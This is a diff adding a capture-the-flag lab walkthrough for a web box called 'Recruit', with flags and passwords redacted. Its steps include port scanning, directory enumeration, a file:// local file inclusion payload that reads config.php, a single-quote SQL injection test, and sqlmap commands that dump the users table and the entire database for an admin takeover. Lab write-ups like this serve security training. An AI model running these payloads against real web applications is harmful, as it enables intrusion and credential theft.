@@ -1,0 +1,85 @@
+Recruit - Web App Walkthrough
+=============================
+Target box written up as a methodology. Flags and recovered passwords are
+REDACTED - only techniques kept. Replace <Machine_IP> with the actual host.
+
+# 1. Scan the target
+nmap -sS -vv -p- -A <Machine_IP>
+
+# 2. Add hostname
+sudo nano /etc/hosts
+# Add:
+<Machine_IP> recruit.thm
+
+# 3. Directory enumeration
+gobuster dir \
+  -u http://recruit.thm \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+# Interesting directories:
+/mail/
+/assets/
+/phpmyadmin/
+/server-status
+
+# 4. Read the email (info disclosure)
+http://recruit.thm/mail/
+# Email clue:
+#   - HR credentials stored in config.php
+#   - Admin credentials stored in database
+
+# 5. Visit API documentation
+http://recruit.thm/api.php
+# API endpoint:
+/file.php?cv=<URL>
+
+# 6. Local File Inclusion (LFI) - read config file
+http://recruit.thm/file.php?cv=file://config.php
+# Credentials found (REDACTED):
+Username: hr
+Password: <REDACTED>
+
+# 7. Login
+http://recruit.thm/
+Username: hr
+Password: <REDACTED>
+# HR Flag: <REDACTED>
+
+# 8. Test search field for SQL Injection
+'
+# A single quote breaks the query -> error -> injectable.
+
+# 9. Capture the search request with Burp Suite
+# Save as:
+request.txt
+
+# 10. Enumerate databases
+sqlmap -r request.txt -p search --dbs
+# Output:
+# information_schema, mysql, performance_schema, phpmyadmin, recruit_db, sys
+
+# 11. Enumerate tables
+sqlmap -r request.txt -p search -D recruit_db --tables
+# Output: candidates, users
+
+# 12. Enumerate columns
+sqlmap -r request.txt -p search -D recruit_db -T users --columns
+
+# 13. Dump users table
+sqlmap -r request.txt -p search -D recruit_db -T users --dump
+# OR dump everything
+sqlmap -r request.txt -D recruit_db --dump-all
+# Credentials recovered (REDACTED):
+Username: admin
+Password: <REDACTED>
+
+# 14. Login as administrator
+http://recruit.thm/
+Username: admin
+Password: <REDACTED>
+# Admin Flag: <REDACTED>
+
+Methodology summary
+-------------------
+Enumerate dirs -> info disclosure (/mail, api.php) -> LFI (file://) to read
+config.php -> SQLi in search -> sqlmap dump -> admin takeover.
